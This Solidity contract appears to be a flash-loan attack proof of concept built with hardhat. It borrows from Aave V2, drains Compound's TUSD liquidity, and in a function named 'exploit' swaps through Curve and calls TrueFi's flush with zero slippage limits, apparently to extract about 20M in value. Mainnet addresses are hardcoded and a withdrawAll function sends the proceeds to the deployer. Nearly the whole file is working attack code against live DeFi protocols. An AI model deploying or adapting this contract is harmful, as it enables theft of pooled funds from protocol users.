pragma solidity ^0.6.6;

import "./ComptrollerInterface.sol";
import "./CTokenInterface.sol";


import { FlashLoanReceiverBase } from "./aave/FlashLoanReceiverBase.sol";
import { ILendingPool, ILendingPoolAddressesProvider, IERC20 } from "./aave/Interfaces.sol";
import { SafeERC20, SafeMath } from "./aave/Libraries.sol";

import "hardhat/console.sol";

interface ILendingPoolCore {
    function getReserveAvailableLiquidity(address _reserve) external view returns (uint256);
}
interface TrueFi {
    function currencyBalance() external view returns (uint256);
    function flush(uint256 currencyAmount, uint256 minMintAmount) external;
    function join(uint256 amount) external;

}

interface CrvSwap {
    function exchange_underlying(int128 j, int128 dx, uint256 amount, uint256 minAmount) external;
}

interface IYearn {
    function balance() external view returns (uint256);
    function supplyAave(uint amount) external; 
}

contract Flashloan is FlashLoanReceiverBase {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    uint256 public totalAmount;
    uint256 public maximumTUSD;
    IERC20 TUSD;
    IERC20 DAI;
    CTokenInterface CTUSD;
    CTokenInterface CDAI;
    ComptrollerInterface Comptroller;
    address adv;
    constructor () 
    FlashLoanReceiverBase(ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5)) public {
        adv = msg.sender;
        // enter compound markets


        DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        TUSD = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
        CTUSD = CTokenInterface(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
        CDAI = CTokenInterface(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
        Comptroller = ComptrollerInterface(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);

        address[] memory assets = new address[](1);
        assets[0] = address(CDAI);
        Comptroller.enterMarkets(assets);
    }

    /**
        This function is called after your contract has received the flash loaned amount
     */
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        override
        returns (bool)
    {
        console.log("received aave loans");
        // Deposit dai to get all TUSD available;
        borrowFromComp();
        maximumTUSD = TUSD.balanceOf(address(this));
        console.log("received total TUSD", maximumTUSD);

        // We will get 20M. Giving away 1 dai is not a big deal.
        exploit(premiums[1] + 1 ether);
        console.log("total TUSD after exploit", TUSD.balanceOf(address(this)));

        repayToComp();
        // Approve the LendingPool contract allowance to *pull* the owed amount
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).safeApprove(address(LENDING_POOL), amountOwing);
        }

        return true;
    }

    function borrowFromComp() internal {
        // comp address = 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86
        uint256 daiAmount = DAI.balanceOf(address(this));
        console.log("my dai amount", daiAmount);
        uint256 borrowAmount = CTUSD.getCash();
        DAI.safeApprove(address(CDAI), daiAmount);
        CDAI.mint(daiAmount);
        CTUSD.borrow(borrowAmount);
        console.log("TUSD amount", borrowAmount);
    }

    function repayToComp() internal {
        uint256 repayAmount = CTUSD.borrowBalanceCurrent(address(this));
        TUSD.approve(address(CTUSD), repayAmount);
        CTUSD.repayBorrow(repayAmount);
        uint256 cdaiAmount = CDAI.balanceOf(address(this));
        CDAI.approve(address(CDAI), cdaiAmount);
        CDAI.redeem(cdaiAmount);
    }

    function exploit(uint256 daiPremium) internal {
        CrvSwap swap = CrvSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
        TrueFi trueFi = TrueFi(0xa1e72267084192Db7387c8CC1328fadE470e4149);
        uint256 totalAmount = TUSD.balanceOf(address(this));
        uint256 swap_amount = 18000000 ether;

        IERC20 tether = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        TUSD.approve(address(swap), totalAmount);

        swap.exchange_underlying(3, 0, swap_amount, 0);
        swap.exchange_underlying(3, 1, swap_amount, 0);
        uint256 leftAmount =  TUSD.balanceOf(address(this));
        swap.exchange_underlying(3, 2, leftAmount, 0);

        uint256 trueFiAmount = trueFi.currencyBalance();
        trueFi.flush(trueFiAmount, 0);
        uint256 tether_amount = tether.balanceOf(address(this));


        uint256 dai_amount = dai.balanceOf(address(this));
        dai.approve(address(swap), dai_amount);
        swap.exchange_underlying(0, 3, dai_amount-daiPremium, 0);

        uint256 usdc_amount = usdc.balanceOf(address(this));
        usdc.safeApprove(address(swap), usdc_amount);
        swap.exchange_underlying(1, 3, usdc_amount, 0);

        tether.safeApprove(address(swap), tether_amount);
        swap.exchange_underlying(2, 3, tether_amount, 0);
    
    }


    function startV2() internal {
        // get total liquidity
        address[] memory assets = new address[](2);
        assets[0] =  address(TUSD);
        assets[1] = address(DAI);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = TUSD.balanceOf(0x101cc05f4A51C0319f570d5E146a8C625198e636);
        amounts[1] = 80000000 ether;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        LENDING_POOL.flashLoan(address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
    
        );
    }


    function withdrawAll() public {
        require(msg.sender == adv);
        uint256 totalAmount = TUSD.balanceOf(address(this));
        TUSD.safeTransfer(adv, totalAmount);
    }

    function flashloan() public  {
        require(msg.sender == adv);
        // borrow from aaveV2
        console.log("start");
        startV2();
        console.log("TUSD left", TUSD.balanceOf(address(this)));
    }
}